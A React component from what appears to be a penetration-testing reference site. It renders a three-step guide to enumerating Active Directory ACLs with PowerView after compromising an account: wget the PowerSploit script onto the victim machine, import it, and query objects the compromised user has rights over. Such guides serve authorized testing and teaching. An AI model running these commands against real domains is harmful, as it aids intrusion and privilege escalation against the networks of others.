import {
  Typography,
  Accordion,
  AccordionSummary,
  AccordionDetails,
  Box,
} from "@mui/material";
import SyntaxHighlighter from "react-syntax-highlighter";
import ExpandMoreIcon from "@mui/icons-material/ExpandMore";

interface IProps {
  title: string;
}

const ACLEnumeration = ({ title }: IProps) => {
  return (
    <>
      {" "}
      <Accordion sx={{ backgroundColor: "primary.main" }}>
        <AccordionSummary
          expandIcon={<ExpandMoreIcon />}
          aria-controls="panel1a-content"
          id="panel1a-header"
        >
          <Typography>{title}</Typography>
        </AccordionSummary>
        <AccordionDetails
          sx={{ backgroundColor: "primary.background_accordian" }}
        >
          <Typography
            sx={{
              color: "primary.main",
            }}
          >
            <Typography variant="h6">Description</Typography>
            <Typography>
              When we compomise an account we can use PowerView.ps1 to enumerate
              ACLs to identify misconfigurations (This is easier to visualize in
              BloodHound, but PowerView can be useful as well).
            </Typography>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 1</Typography>
            <Typography>
              Download PowerView.ps1 and transfer it to the victim machine.
            </Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {
                "wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1"
              }
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 2</Typography>
            <Typography>Import the PowerView.ps1 module.</Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {"Import-Module .\\PowerView.ps1"}
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 3</Typography>
            <Typography>
              The command below will find all domain objects that our
              compromised used has rights over by mapping the user's SID to the
              SecurityIdentifier property which is what tells us who has the
              given right over an object.
            </Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {
                "Get-DomainObjectACL -ResolveGUIDs -Identity * |? {$_.SecurityIdentifier -eq (Convert-NameToSid {COMPROMISED_USERNAME})}"
              }
            </SyntaxHighlighter>
            <Box sx={{ m: 2 }} />
            <Typography>Example</Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {
                "Get-DomainObjectACL -ResolveGUIDs -Identity * |? {$_.SecurityIdentifier -eq (Convert-NameToSid wley)}"
              }
            </SyntaxHighlighter>
          </Typography>
        </AccordionDetails>
      </Accordion>
    </>
  );
};

export default ACLEnumeration;
